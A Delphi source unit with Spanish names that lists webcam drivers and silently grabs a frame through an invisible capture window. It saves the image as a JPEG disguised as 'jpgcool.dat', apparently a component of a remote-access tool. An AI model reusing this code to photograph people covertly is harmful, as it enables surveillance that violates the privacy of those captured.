unit UnitWebcam;

interface

uses
  Windows,
  SysUtils,
  Graphics,
  Jpeg;

const
  WM_CAP_START = $0400;
  WM_CAP_DRIVER_CONNECT = $0400 + 10;
  WM_CAP_DRIVER_DISCONNECT = $0400 + 11;
  WM_CAP_SAVEDIB = $0400 + 25;
  WM_CAP_GRAB_FRAME = $0400 + 60;
  WM_CAP_STOP = $0400 + 68;

var
  CaptureWindow: dword;

function capCreateCaptureWindowA(lpszWindowName: PChar; dwStyle: dword;
  x, y, nWidth, nHeight: word; ParentWin: dword; nId: word): dword;
  stdcall external 'AVICAP32.DLL';
function capGetDriverDescriptionA(wDriverIndex: UINT; lpszName: LPSTR;
  cbName: integer; lpszVer: LPSTR; cbVer: integer): BOOL; stdcall;
  external 'AVICAP32.DLL';

function ListarDispositivos(): string;
function CapturarWebcam(NivelCompresion, NumeroDeWebcam: integer): boolean;
function ConseguirCapturaWebcam(NumeroDeWebcam: integer): TBitmap;

implementation

function ListarDispositivos(): string;
var
  szName, szVersion: array[0..MAX_PATH] of char;
  iReturn: boolean;
  x: integer;
begin
  x := 0;
  repeat
    iReturn := capGetDriverDescriptionA(x, @szName, sizeof(szName),
      @szVersion, sizeof(szVersion));
    if iReturn then
    begin
      Result := Result + szName + ' - ' + szVersion + '|';
      Inc(x);
    end;
  until iReturn = False;
end;

function CapturarWebcam(NivelCompresion, NumeroDeWebcam: integer): boolean;
var
  bit: TBitmap;
  Jpg: TjpegImage;
begin
  bit := ConseguirCapturaWebcam(NumeroDeWebcam);
  if bit <> nil then
  begin
    Jpg := TjpegImage.Create;
    Jpg.Assign(bit);
    Jpg.CompressionQuality := NivelCompresion;
    Jpg.Compress;
    Jpg.SaveToFile(ExtractFilePath(ParamStr(0)) + 'jpgcool.dat');
    Jpg.Free;
    DeleteFile(PChar('~~tmp.bmp'));
    Result := True;
  end
  else
    Result := False;
end;

function ConseguirCapturaWebcam(NumeroDeWebcam: integer): TBitmap;
var
  bit: TBitmap;
begin
  CaptureWindow := capCreateCaptureWindowA('CaptureWindow', WS_CHILD or
    WS_DISABLED, 0, 0, 0, 0, GetDesktopWindow, 0);
  if CaptureWindow <> 0 then
  begin
    if SendMessage(CaptureWindow, WM_CAP_DRIVER_CONNECT, NumeroDeWebcam, 0) <> 0 then
    begin
      SendMessage(CaptureWindow, WM_CAP_GRAB_FRAME, 0, 0);
      SendMessage(CaptureWindow, WM_CAP_SAVEDIB, 0, longint(PChar('~~tmp.bmp')));
      SendMessage(CaptureWindow, WM_CAP_DRIVER_DISCONNECT, 0, 0);
      CaptureWindow := 0;
      bit := TBitmap.Create();
      bit.LoadFromFile('~~tmp.bmp');
      Result := bit;
    end
    else
      Result := nil;
  end
  else
    Result := nil;
end;

end.
